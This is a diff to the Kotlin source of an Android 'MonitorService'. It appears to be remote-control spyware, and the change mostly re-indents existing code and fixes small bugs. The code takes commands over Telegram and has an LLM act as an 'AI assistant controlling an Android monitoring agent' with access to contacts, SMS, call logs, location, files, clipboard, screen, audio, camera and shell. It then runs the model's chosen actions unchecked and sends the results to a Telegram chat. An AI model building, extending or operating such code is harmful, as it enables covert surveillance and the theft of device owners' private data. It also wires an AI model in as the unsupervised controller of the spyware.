@@ -34,9 +34,6 @@ import okhttp3.Request
 import okhttp3.RequestBody
 import okhttp3.Response
 import java.io.File
-import java.text.SimpleDateFormat
-import java.util.Date
-import java.util.Locale
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.CountDownLatch
@@ -694,16 +691,16 @@ class MonitorService : Service() {
 /test - Run test (screenshot + 10 SMS + location)
 """.trimIndent()
 
-// ===== NVIDIA NEMOTRON 3 ULTRA 550B AI INTEGRATION =====
+    // ===== NVIDIA NEMOTRON 3 ULTRA 550B AI INTEGRATION =====
 
-private fun callNemotron(prompt: String): String {
-    try {
-        val lower = prompt.lowercase()
-        if (Pattern.matches("^(hi|hello|hey|test|ping)$", lower)) {
-            return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
-        }
+    private fun callNemotron(prompt: String): String {
+        try {
+            val lower = prompt.lowercase()
+            if (Pattern.matches("^(hi|hello|hey|test|ping)$", lower)) {
+                return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
+            }
 
-        val systemPrompt = """You are an AI assistant controlling an Android monitoring agent.
+            val systemPrompt = """You are an AI assistant controlling an Android monitoring agent.
 Available capabilities: contacts, sms, call_logs, apps, location, files, wifi, clipboard, screen, audio, camera, shell
 For each user request, respond with a JSON object containing:
 {
@@ -714,142 +711,142 @@ For each user request, respond with a JSON object containing:
 If multiple actions needed, return array of actions.
 Only respond with valid JSON, no extra text."""
 
-        val payload = mutableMapOf<String, Any>()
-        payload["model"] = NVIDIA_MODEL
-        payload["messages"] = listOf(
-            mapOf("role" to "system", "content" to systemPrompt),
-            mapOf("role" to "user", "content" to prompt)
-        )
-        payload["temperature"] = 0.1
-        payload["max_tokens"] = 2048
-        payload["top_p"] = 0.9
-        payload["stream"] = false
+            val payload = mutableMapOf<String, Any>()
+            payload["model"] = NVIDIA_MODEL
+            payload["messages"] = listOf(
+                mapOf("role" to "system", "content" to systemPrompt),
+                mapOf("role" to "user", "content" to prompt)
+            )
+            payload["temperature"] = 0.1
+            payload["max_tokens"] = 2048
+            payload["top_p"] = 0.9
+            payload["stream"] = false
 
-        val body = gson.toJson(payload).toRequestBody("application/json".toMediaType())
-        val req = Request.Builder()
-            .url(NVIDIA_API_URL)
-            .addHeader("Authorization", "Bearer $NVIDIA_API_KEY")
-            .addHeader("Content-Type", "application/json")
-            .post(body)
-            .build()
+            val body = gson.toJson(payload).toRequestBody("application/json".toMediaType())
+            val req = Request.Builder()
+                .url(NVIDIA_API_URL)
+                .addHeader("Authorization", "Bearer $NVIDIA_API_KEY")
+                .addHeader("Content-Type", "application/json")
+                .post(body)
+                .build()
 
-        client.newCall(req).execute().use { resp ->
-            val responseBody = resp.body?.string() ?: ""
-            if (resp.isSuccessful) {
-                val json = com.google.gson.JsonParser.parseString(responseBody).asJsonObject
-                val content = json.get("choices").asJsonArray[0].asJsonObject
-                    .get("message").asJsonObject.get("content").asString
-                return content
-            } else {
-                Log.e("Nemotron", "API error: $resp.code - $responseBody")
-                return "{\"error\": \"API error: $resp.code\"}"
-            }
-        }
-    } catch (e: Exception) {
-        Log.e("Nemotron", "Error", e)
-        return "{\"error\": \"${e.message}\"}"
-    }
-}
-
-private fun executeAiActions(aiResponse: String): List<Map<String, Any>> {
-    val results = mutableListOf<Map<String, Any>>()
-    try {
-        val json = com.google.gson.JsonParser.parseString(aiResponse)
-        val actions = when {
-            json.isJsonArray -> json.asJsonArray
-            json.isJsonObject -> {
-                val arr = com.google.gson.JsonArray()
-                arr.add(json)
-                arr
-            }
-            else -> return results
-        }
-
-        actions.forEach { actionJson ->
-            val actionObj = actionJson.asJsonObject
-            val action = actionObj.get("action")?.asString ?: ""
-            val args = actionObj.get("args")?.asJsonObject
-            val reasoning = actionObj.get("reasoning")?.asString ?: ""
-
-            val argsMap = mutableMapOf<String, Any>()
-            args?.entrySet()?.forEach { entry ->
-                val value: Any = when {
-                    entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isString -> entry.value.asString
-                    entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isNumber -> entry.value.asJsonPrimitive.asDouble
-                    entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isBoolean -> entry.value.asBoolean
-                    else -> entry.value.toString() ?: ""
-                }
-                argsMap[entry.key] = value
-            }
-
-            try {
-                val result = executeCapability(action, gson.toJson(argsMap))
-                val m = mutableMapOf<String, Any>()
-                m["action"] = action
-                m["args"] = argsMap
-                m["reasoning"] = reasoning
-                m["result"] = result
-                m["status"] = "completed"
-                results.add(m)
-            } catch (e: Exception) {
-                val m = mutableMapOf<String, Any>()
-                m["action"] = action
-                m["args"] = argsMap
-                m["reasoning"] = reasoning
-                m["error"] = e.message ?: "unknown error"
-                m["status"] = "failed"
-                results.add(m)
-            }
-        }
-    } catch (e: Exception) {
-        Log.e("AI", "Parse error", e)
-        results.add(mapOf("error" to e.message ?: "unknown error", "raw_response" to aiResponse))
-    }
-    return results
-}
-
-private fun handleAiCommand(chatId: Long, prompt: String) {
-    val taskId = java.util.UUID.randomUUID().toString()
-    val latch = CountDownLatch(1)
-    val callback = TelegramCallback(chatId, latch)
-    telegramCallbacks[taskId] = callback
-
-    Thread({
-        try {
-            val aiResponse = callNemotron(prompt)
-            Log.d("AI", "Nemotron response: $aiResponse")
-
-            val results = executeAiActions(aiResponse)
-
-            val summary = StringBuilder("AI Task $taskId completed:\n\n")
-            results.forEach { r ->
-                summary.append("Action: ${r["action"]}\n")
-                summary.append("Reasoning: ${r["reasoning"]}\n")
-                if (r["status"] == "completed") {
-                    summary.append("Result: ${r["result"]}\n")
+            client.newCall(req).execute().use { resp ->
+                val responseBody = resp.body?.string() ?: ""
+                if (resp.isSuccessful) {
+                    val json = com.google.gson.JsonParser.parseString(responseBody).asJsonObject
+                    val content = json.get("choices").asJsonArray[0].asJsonObject
+                        .get("message").asJsonObject.get("content").asString
+                    return content
                 } else {
-                    summary.append("Error: ${r["error"]}\n")
+                    Log.e("Nemotron", "API error: ${resp.code} - $responseBody")
+                    return "{\"error\": \"API error: ${resp.code}\"}"
                 }
-                summary.append("\n")
-            }
-
-            val msg = summary.toString()
-            if (latch.await(60, TimeUnit.SECONDS)) {
-                callback.result = msg
-                callback.status = "completed"
-                callback.latch.countDown()
-                sendTelegramDocument(chatId, "ai_result.txt", msg, "AI Task Result")
-            } else {
-                sendTelegramMessage(chatId, "AI task $taskId timed out")
             }
         } catch (e: Exception) {
-            Log.e("AI", "Error", e)
-            sendTelegramMessage(chatId, "AI Error: ${e.message}")
-        } finally {
-            telegramCallbacks.remove(taskId)
+            Log.e("Nemotron", "Error", e)
+            return "{\"error\": \"${e.message}\"}"
         }
-    }, "ai-$taskId").start()
-}
+    }
+
+    private fun executeAiActions(aiResponse: String): List<Map<String, Any>> {
+        val results = mutableListOf<Map<String, Any>>()
+        try {
+            val json = com.google.gson.JsonParser.parseString(aiResponse)
+            val actions = when {
+                json.isJsonArray -> json.asJsonArray
+                json.isJsonObject -> {
+                    val arr = com.google.gson.JsonArray()
+                    arr.add(json)
+                    arr
+                }
+                else -> return results
+            }
+
+            actions.forEach { actionJson ->
+                val actionObj = actionJson.asJsonObject
+                val action = actionObj.get("action")?.asString ?: ""
+                val args = actionObj.get("args")?.asJsonObject
+                val reasoning = actionObj.get("reasoning")?.asString ?: ""
+
+                val argsMap = mutableMapOf<String, Any>()
+                args?.entrySet()?.forEach { entry ->
+                    val value: Any = when {
+                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isString -> entry.value.asString
+                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isNumber -> entry.value.asJsonPrimitive.asDouble
+                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isBoolean -> entry.value.asBoolean
+                        else -> entry.value.toString() ?: ""
+                    }
+                    argsMap[entry.key] = value
+                }
+
+                try {
+                    val result = executeCapability(action, gson.toJson(argsMap))
+                    val m = mutableMapOf<String, Any>()
+                    m["action"] = action
+                    m["args"] = argsMap
+                    m["reasoning"] = reasoning
+                    m["result"] = result
+                    m["status"] = "completed"
+                    results.add(m)
+                } catch (e: Exception) {
+                    val m = mutableMapOf<String, Any>()
+                    m["action"] = action
+                    m["args"] = argsMap
+                    m["reasoning"] = reasoning
+                    m["error"] = e.message ?: "unknown error"
+                    m["status"] = "failed"
+                    results.add(m)
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("AI", "Parse error", e)
+            results.add(mapOf("error" to e.message ?: "unknown error", "raw_response" to aiResponse))
+        }
+        return results
+    }
+
+    private fun handleAiCommand(chatId: Long, prompt: String) {
+        val taskId = java.util.UUID.randomUUID().toString()
+        val latch = CountDownLatch(1)
+        val callback = TelegramCallback(chatId, latch)
+        telegramCallbacks[taskId] = callback
+
+        Thread({
+            try {
+                val aiResponse = callNemotron(prompt)
+                Log.d("AI", "Nemotron response: $aiResponse")
+
+                val results = executeAiActions(aiResponse)
+
+                val summary = StringBuilder("AI Task $taskId completed:\n\n")
+                results.forEach { r ->
+                    summary.append("Action: ${r["action"]}\n")
+                    summary.append("Reasoning: ${r["reasoning"]}\n")
+                    if (r["status"] == "completed") {
+                        summary.append("Result: ${r["result"]}\n")
+                    } else {
+                        summary.append("Error: ${r["error"]}\n")
+                    }
+                    summary.append("\n")
+                }
+
+                val msg = summary.toString()
+                if (latch.await(60, TimeUnit.SECONDS)) {
+                    callback.result = msg
+                    callback.status = "completed"
+                    callback.latch.countDown()
+                    sendTelegramDocument(chatId, "ai_result.txt", msg, "AI Task Result")
+                } else {
+                    sendTelegramMessage(chatId, "AI task $taskId timed out")
+                }
+            } catch (e: Exception) {
+                Log.e("AI", "Error", e)
+                sendTelegramMessage(chatId, "AI Error: ${e.message}")
+            } finally {
+                telegramCallbacks.remove(taskId)
+            }
+        }, "ai-$taskId").start()
+    }
 
     override fun onBind(intent: Intent): IBinder = binder
 
